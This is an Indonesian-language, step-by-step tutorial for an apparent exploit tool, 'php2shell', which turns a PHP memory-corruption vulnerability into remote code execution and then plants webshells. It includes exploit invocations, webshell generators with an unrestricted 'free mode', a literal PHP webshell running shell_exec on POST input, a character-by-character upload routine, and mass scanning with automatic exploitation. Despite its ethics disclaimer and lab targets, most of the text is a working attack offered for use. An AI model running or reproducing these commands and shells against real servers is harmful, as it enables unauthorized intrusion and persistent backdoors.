# TUTORIAL php2shell v1.5.1 — pemakaian setiap fitur, langkah demi langkah

Semua perintah di file ini **diuji live** di lab penulis (26 Okt 2026,
PHP 8.4.26 amd64, Apache 2.4.69 mod_php, single-worker prefork).
Target contoh di seluruh tutorial: `http://127.0.0.1:8093/`
(ganti dengan target-mu).

> ETIKA: hanya untuk target MILIK SENDIRI / otorisasi tertulis.
> Untuk bug bounty: hampir semua RoE melarang shell tertinggal — cukup
> bukti RCE (`--proof-file`), berhenti di situ.

---

## 0. Persiapan (sekali)

```bash
cd /home/lota1337/python/php2shell
source /home/lota1337/myenv/bin/activate

# lab target (kontainer php:8.4.26-apache + conf lab):
docker start p2s-rce3 && sleep 2
curl -s http://127.0.0.1:8093/          # harus mencetak: OK3
```

Prasyarat target agar rantai jalan (dicek di §2):
- mod_php (bukan php-fpm), single-worker prefork, KeepAlive Off
- `session.upload_progress.enabled = On`
- `memory_limit` kecil (lab: 8M)
- PHP rentan: ≤ 8.2.34 / ≤ 8.3.35 / ≤ 8.4.26 / ≤ 8.5.11

---

## 1. `version` — identitas & advisories (read-only)

```bash
python php2shell.py version
python php2shell.py version --advisories
python php2shell.py version --advisories --no-cache   # paksa cek ulang GitHub
```
Terbaca: versi tool, fix-floor (versi patch pertama tiap branch), daftar
CVE yang didukung + status patch.

## 2. `builds` — dukungan rantai per build PHP

```bash
python php2shell.py builds
python php2shell.py builds --level rce     # hanya yang RCE penuh
```
Makna level:
- `RCE`  = stage 1-3 terbukti; perintah benar-benar dieksekusi.
- `LEAK` = alamat bocor saja; stage-3 tidak jalan di build itu.
- `NO`   = belum terbukti (UAF ada, bentuk leak berbeda).
Versi rentan terakhir per branch: 8.2.34 / 8.3.35 / 8.4.26 / 8.5.11.

## 3. `detect` — kenali target tanpa menyerang (read-only)

```bash
python php2shell.py detect -u http://127.0.0.1:8093/
```
Output penting:
```
verdict  : vulnerable — PHP 8.4.26 < fix-floor 8.4.27 (terakhir rentan: 8.4.26)
skor     : 75/90  (READY)
```
- `skor` = kesiapan; `READY` = layak dieksploitasi.
- Probe aktif (upload_progress, OOM) jalan otomatis HANYA bila versi tidak
  bocor; matikan dengan `--no-oom` / `--no-upload-progress`.
- Bila target di balik CDN dan versi tak bocor → verdict `unknown` +
  penjelasan jujur (bukan dugaan).
- Pilih SAPI bila tahu: `--sapi auto|fpm|mod_php` (mengubah aturan sinyal
  OOM: 502/503/504 & 200-kosong hanya sah untuk fpm).

## 4. `preflight` — cek kelima syarat teknis rantai

```bash
python php2shell.py preflight -u http://127.0.0.1:8093/
```
Membaca: memory_limit, upload_progress, display_errors, worker-model,
retry kekalahan; ringkasan `siap eksploitasi: YA/TIDAK` + BLOCKER bila ada.
`--json out.json` untuk mesin; `--csv` untuk spreadsheet.

## 5. `exploit` — RCE terbukti (BUKTI dulu, selalu langkah pertama!)

```bash
# kanal bukti file (lab ber-mount /out):
python php2shell.py exploit -u http://127.0.0.1:8093/ --yes --proof-file p1
#   → PROOF (…s): uid=33(www-data) gid=33(www-data) groups=33(www-data)

# variasi perintah proof (whitelist):
python php2shell.py exploit -u <URL> --yes --proof-file p1 --allow-cmd uname
```
- `--cmd 'id'` default; **maksimal 14 byte**; tanpa `; | & $ \` > <`.
- `--proof-file p1`: menulis `id>/out/p1` lalu membaca hasilnya — inilah
  yang membuat RCE "kelihatan"; tanpa ini di target tanpa kanal → `BLIND`
  (perintah jalan, tapi tak ada bukti balik).
- `--force` untuk tetap lanjut walau preflight tak siap (jarang perlu).
- `--zif-offset/--dtor-offset/--htdata-offset/--offsets-file` untuk build
  non-bookworm (lihat §6 builds / RUNBOOK).
- Kegagalan jujur: `HEAP_LEAK_FAILED`, `BLIND` = tool berhenti, bukan muluk.

## 6. `shell` — generator webshell (untuk lab/otorisasi)

**6a. Bawaan CLI (whitelist, Basic-Auth):**
```bash
python php2shell.py shell --out /run/media/lota1337/AarSSDaputra/p2s-lab/shell-live --ttl 24
# keluar: <32-hex>.php + CREDENTIALS.txt (mode 600) — password di sana
```
- Gate: tanpa password → 401; password salah → 401; `c` di luar whitelist
  → 403. Whitelist: `id, whoami, uname -a, pwd, hostname, php -v`.
- bcrypt cost 12, TTL jam (file shell auto-hapus), audit log per request.
- Kustom: `--commands 'id,whoami'`, `--author`, `--purpose`.

Uji shell bawaan (curl):
```bash
PW=$(grep -i 'password' /run/media/lota1337/AarSSDaputra/p2s-lab/shell-live/CREDENTIALS.txt | head -1 | awk '{print $NF}')
curl -s -X POST -d "k=$PW" -d 'c=id' http://127.0.0.1:8097/<nama>.php
```

**6b. Generator lengkap (2 varian: web login-page + CLI fleksibel):**
```bash
/home/lota1337/myenv/bin/python shell/web_shell_gen.py --out /run/media/lota1337/AarSSDaputra/p2s-lab/shell-live --ttl 24 [--variant web|cli|both]
# keluar: 2 file shell + CREDENTIALS-<ts>.txt (mode 600)
```
- Varian **web**: satu file (HTML+CSS+JS+PHP), halaman login di browser
  (BUKAN popup Basic), terminal interaktif + opsi "mode bebas" (perintah
  apa pun setelah login).
- Varian **cli**: Basic Auth diterima (popup browser pun jalan) + mode
  bebas dengan `c` biasa.
- bcrypt+TTL+audit sama; kredensial ditulis `CREDENTIALS-<ts>.txt`.

## 7. Up-shell dari RCE (puncak) — DUA jalur

### 7a. Jalur cepat (target lab yang mount /out dari host)
```bash
# 1) siapkan 2 file di out/ host (terbaca /out di target):
cat > out/u <<'EOF'
#!/bin/sh
cp /out/w9.php /var/www/html/w9.php
EOF
cat > out/w9.php <<'EOF'
<?php if (isset($_POST['k']) && $_POST['k']==='up9' && isset($_POST['c'])) { $c=$_POST['c']; echo ($c==='__free__') ? shell_exec($_POST['cmd']) : shell_exec($c); }
EOF
# 2) satu perintah RCE 9 byte:
python shell/upshell_lab.py -u http://127.0.0.1:8094/ --password up9
# 3) pakai:
curl -s -X POST -d 'k=up9' -d 'c=id' http://127.0.0.1:8094/w9.php
```

### 7b. Jalur live-style UNIVERSAL (tanpa mount — kerjakan di target mana pun di lab)
```bash
python shell/upshell_live.py -u http://127.0.0.1:8093/ --name s3.php
```
Yang dilakukan tool (semua otomatis, ±10 dtk/char ⇒ ±9 mnt):
1. full-chain leak per perintah (chunk → libphp → stage3);
2. b64 shell dipecah 1 char/request: `printf 'C' >v` … `>>v` (14 byte pas)
   — **verifikasi per-char via GET /v** + retry otomatis;
3. `base64 -d<v>g` → `mv g s3.php` → bersih-bersih;
4. verifikasi akhir POST `c=id` → `uid=`.

Pakai:
```bash
curl -s -X POST -d 'c=id' http://127.0.0.1:8093/s3.php
curl -s -X POST --data-urlencode 'c=ls -la /var/www/html; hostname' http://127.0.0.1:8093/s3.php
```

**ATURAN PENTING single-writer:** pastikan TIDAK ada instansi upshell lain
hidup (`ps -ef | grep upshell`) dan cron 1-menit-mu **pause** selama deploy.
Dua penulis pada file staging yang sama = file korup (pelajaran 26 Okt).

**Lanjut dari posisi bila terputus:** tool verified per-char; kalau terganggu,
jalankan ulang command yang sama — dia melanjutkan dari prefix yang valid.

Error umum:
- `Fatal: Undefined constant "c"` → shell dieksekusi TANPA `?c=…`. Wajib
  sertakan param `c` (POST `d 'c=id'` atau GET `?c=hostname`).
- `mismatch` berulang di char sama → pastikan tunggal penulis; ulang.
- Gagal terus di build selain 8.4.26-bookworm → cek `builds`; bisa jadi
  LEAK/NO untuk build itu (offset beda).

## 8. `scan` — banyak target sekaligus

```bash
printf "http://127.0.0.1:8093/\nhttp://127.0.0.1:8099/\n" > targets.txt
python php2shell.py scan -l targets.txt --json hasil.json --csv hasil.csv
# lanjut eksploit otomatis target READY (hati-hati; hanya lab):
python php2shell.py scan -l targets.txt --exploit --yes
```
Ringkasan warna: vulnerable merah, patched hijau, unknown kuning.
Opsi berguna: `--check-version`, `--audit audit.jsonl` (trace JSONL tiap
request — very handy untuk dokumentasi), `--proxy http://127.0.0.1:8080`.

## 9. Membersihkan pasca-uji (WAJIB di lab bersama)

```bash
# hapus shell + staging via RCE itu sendiri:
curl -s -X POST --data-urlencode 'c=rm -f /var/www/html/s3.php /var/www/html/v /var/www/html/g' http://127.0.0.1:8093/s3.php
# atau penuh lewat tool (lihat RUNBOOK §7).
docker stop p2s-rce3    # matikan lab bila selesai
```

## 10. Etika & jebakan yang sudah ditembus (pelajaran nyata)

- `detect`/`preflight` = read-only. `exploit` hanya dengan bukti.
- 14-byte limit BUKAN kekurangan — desain carrier; up-shell = tool khusus.
- dash menelan digit sebelum `>>` (fd-redirect) → `printf 'C' >>file`.
- stage3 probabilistik → verifikasi per-char (sudah otomatis di tool).
- PHP 8 strict → `$_REQUEST['c']` (kutip!) — tanpa ini Fatal error.
- Kegagalan jujur (BLIND, HEAP_LEAK_FAILED) = feature keselamatan.
```
